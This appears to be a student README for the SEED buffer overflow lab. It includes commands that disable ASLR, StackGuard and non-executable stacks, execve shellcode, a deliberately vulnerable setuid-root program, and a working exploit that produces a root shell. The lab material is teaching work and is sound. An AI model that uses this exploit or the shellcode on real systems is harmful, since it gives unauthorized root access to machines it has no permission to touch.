# System Security

<br/>

## SEED:

### Developing Instructional Laboratories for Computer SEcurity EDucation

> SEED LABS : https://seedsecuritylabs.org/

The objective of the SEED project is to develop an instructional laboratory environment and laboratory exercises (called SEED labs) for computer system security education.

The goal of our labs is to help students focus on (1) grasping security principles, concepts, and technologies, (2) applying security principles to design and implement security mechanisms, (3) analyzing and testing systems for security properties.

(4) applying security principles to solve real-world problems.

<br/>

<br/>

## Buffer Overflow Vulnerability Lab

### Overview

Buffer overflow is defined as the condition in which a program attempts to write data beyond the boundaries of pre-allocated fixed length buffers.

This vulnerability can be used by a malicious user to alter the flow control of the pro- gram, leading to the execution of malicious code.

his vulnerability can be used by a malicious user to alter the flow control of the program, leading to the execution of malicious code.

This vulnerability arises due to the mixing of the storage for data (e.g. buffers) and the storage for controls (e.g. return addresses): an overflow in the data part can affect the control flow of the program, because an overflow can change the return address.

<br/>

### Turning Off Countermeasures

- **Address Space Randomization**

  - *Ubuntu* and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks.

  - ```bash
    $ sudo sysctl -w kernel.randomize_va_space=0
    kernel.randomize_va_space = 0
    ```

- **The StackGuard Protection Scheme**

  - The GCC compiler implements a security mechanism called Stack-Guard to prevent buffer overflows. In the presence of this protection, buffer overflow attacks will not work. We can disable this protection during the compilation using the *-fno-stack-protector* option. For example, to compile a program `example.c` with StackGuard disabled, we can do the following:

  - ```bash
    gcc -fno-stack-protector example.c
    ```

- **Non-Executable Stack**

  - ```bash
    # For executable stack:
    $ gcc -z execstack -o test test.c
    
    # for non-executable stack:
    $ gcc -z noexecstack -o test test.c
    ```

- **Configuring /bin/sh (Ubuntu 16.04 VM only)**

  - ```bash
    $ sudo ln -sf /bin/zsh /bin/sh
    ```

<br/>

### Running Shellcode

```c
#include <stdio.h>
int main() {
    char*name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

```c
/* call_shellcode.c */

/* A program that launches a shell using shellcode */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
    "\x31\xc0" /* Line 1: xorl %eax,%eax */
    "\x50" /* Line 2: pushl %eax */ "\x68"
    "//sh" /* Line 3: pushl $0x68732f2f */ "\x68"
    "/bin" /* Line 4: pushl $0x6e69622f */ "\x89\xe3" /* Line 5: movl %esp,%ebx */
    "\x50"                                            /* Line 6: pushl %eax */
    "\x53"                                            /* Line 7: pushl %ebx */
    "\x89\xe1"                                        /* Line 8: movl %esp,%ecx */
    "\x99"                                            /* Line 9: cdq */
    "\xb0\x0b"                                        /* Line 10: movb $0x0b,%al */
    "\xcd\x80"                                        /* Line 11: int $0x80 */
    ;

int main(int argc, char **argv)
{
    char buf[sizeof(code)];
    strcpy(buf, code);
    ((void (*)())buf)();
}
```

```
$ gcc -o call_shellcode -z execstack -fno-stack-protector call_shellcode.c
```

<p align="center">
    <img src="README.assets/BufferOverflow1.png"/>
    <div align="center">call_shellcode.c Result</div>
</p>

<br/>

### The Vulnerable Program

```c
/* Vunlerable program: stack.c */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifndef BUF_SIZE
#define BUF_SIZE 24
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;
    /* Change the size of the dummy array to randomize the parameters for this lab.
    Need to use the array at least once */
    char dummy[BUF_SIZE];
    memset(dummy, 0, BUF_SIZE);
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

```bash
$ touch badfile
$ gcc -o stack -g -z execstack -fno-stack-protector stack.c
$ sudo chown root stack
$ sudo chmod 4755 stack
```

<br/>

```c
/* exploit.c */

/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] = "\x31\xc0" /*Line1:xorl%eax,%eax*/
                   "\x50" /*Line2:pushl%eax*/ "\x68"
                   "//sh" /*Line3:pushl$0x68732f2f*/
                   "\x68"
                   "/bin"     /*Line4:pushl$0x6e69622f*/
                   "\x89\xe3" /*Line5:movl%esp,%ebx*/
                   "\x50"     /*Line6:pushl%eax*/
                   "\x53"     /*Line7:pushl%ebx*/
                   "\x89\xe1" /*Line8:movl%esp,%ecx*/
                   "\x99"     /*Line9:cdq*/
                   "\xb0\x0b" /*Line10:movb$0x0b,%al*/
                   "\xcd\x80" /*Line11:int$0x80*/
    ;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile; /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */
    *((long *)(buffer + 36)) = 0xbfffeb08 + 0x88;
    memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode));

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
```

```bash
$ gcc -o exploit exploit.c
$ ./exploit
$ ./stack

# whoami
root
```

